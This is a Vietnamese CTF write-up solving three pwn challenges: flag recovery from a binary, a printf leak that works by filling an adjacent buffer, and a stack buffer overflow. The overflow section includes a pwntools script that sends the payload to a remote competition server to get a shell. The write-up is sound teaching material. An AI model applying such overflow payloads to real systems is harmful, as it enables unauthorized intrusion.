# PWN

## Treasure

Run file ta nhận được part1 của flag: `KCSC{`

![image](https://user-images.githubusercontent.com/80137840/213178223-9ba4837b-edbb-435a-a418-e6d451c3ea86.png)

Tại main trong IDA ta thấy part2 của flag: `4_t1ny_tr34sur3`

![image](https://user-images.githubusercontent.com/80137840/213178483-e865b1d6-1ec8-4f02-a883-7b1f98ebd97b.png)

Mở tab strings view, search với keyword Part 3 ta được part3 flag: `_27651d2df78e1998}`

![image](https://user-images.githubusercontent.com/80137840/213179314-f3755ca1-4498-4330-a1f0-080299810318.png)

Flag: `KCSC{4_t1ny_tr34sur3_27651d2df78e1998}`


## Cat

Dùng IDA để xem cách hoạt động chương trình

![image](https://user-images.githubusercontent.com/80137840/213331387-e5c2f55f-56e7-4e77-be2b-a48b4741b90b.png)

Ta thấy chương trình đọc file flag.txt vào biến flag và nhập Username:Password. Login thành công thì ta được nhập 0x200 bytes vào secret và in ra nó bằng printf.

printf sẽ in cho đến khi gặp byte null + secret lại nằm trên flag cách nhau 0x200

![image](https://user-images.githubusercontent.com/80137840/213331885-87f651cf-6b88-4dd8-8d47-efb848f71c29.png)

Chương trình đọc vào một secret vào biến secret là biến toàn cục lưu ngay trước flag, nếu ta nhập chuỗi 512bytes thì khi printf sử dụng %s sẽ in chuỗi đến khi gặp ký tự null và in ra chuỗi secret + flag.

Ta tìm được Username và Password là KCSC_4dm1n1str4t0r : wh3r3_1s_th3_fl4g

![image](https://user-images.githubusercontent.com/80137840/213333073-a48e8d4e-3714-4596-9f51-c86459c244ab.png)

**Exploit**

![image](https://user-images.githubusercontent.com/80137840/213333368-1d635812-f8eb-4d54-b29a-06ed3adfe8f9.png)

Flag: `KCSC{w3ll_d0n3_y0u_g0t_my_s3cr3t_n0w_d04942f299}`



## OverTheWrite

Xem chương trình bằng IDA

![image](https://user-images.githubusercontent.com/80137840/213335433-9a10c134-53fb-4161-bea2-e47bcc1a3d0f.png)

Dễ thấy bug là buffer overflow khi buf có 32 bytes (int_64 * 4) nhưng lại được nhập 0x50 bytes

Dựa theo chú thích của IDA ta thấy buf cách s1 0x20 bytes, s1 cách v7 0x18 bytes, v7 cách v8 8 bytes và v9 cách v8 0xc bytes

Ta sẽ overflow buf để control các biến s1, v7, v8, v9 và thực thi system("/bin/sh")

Stack khi run chương trình: 

![image](https://user-images.githubusercontent.com/80137840/213343263-c3a01759-de58-4ff0-9e53-078bac710270.png)

**Exploit**: Đầu tiên là buff[4] gồm 32 bytes, kế đến là s1 được thêm /0 vào đuôi tổng 16 bytes. Tiếp theo lần lượt là v6, v7, v8 cuối cùng là v9 là đủ 80 bytes.

v9 có thể p64(v9) hoặc b"A"*4 + p32(v9), do v9 chỉ có 4bytes nên ta phải thêm mấy bytes vào trước cho nó đầy.

Code solve chall:
```
from pwn import *

r = remote('146.190.115.228', 9992)
payload = b'A'*(32) + b'Welcome to KCSC'.ljust(16, b'\x00') + b'A'*8 + p64(0x215241104735F10F) + p64(0xDEADBEEFCAFEBABE) + b'AAAA' + p32(0x13371337)
print(r.recvuntil(b"Key: "))
r.send(payload)
r.interactive()
```

![image](https://user-images.githubusercontent.com/80137840/213342654-37322b98-bc6a-40c6-b3ea-bba1abc657b1.png)

Flag: `KCSC{y0ur_wr1t3_g4v3_y0u_th1s_fl4g_afc4185ea6}`
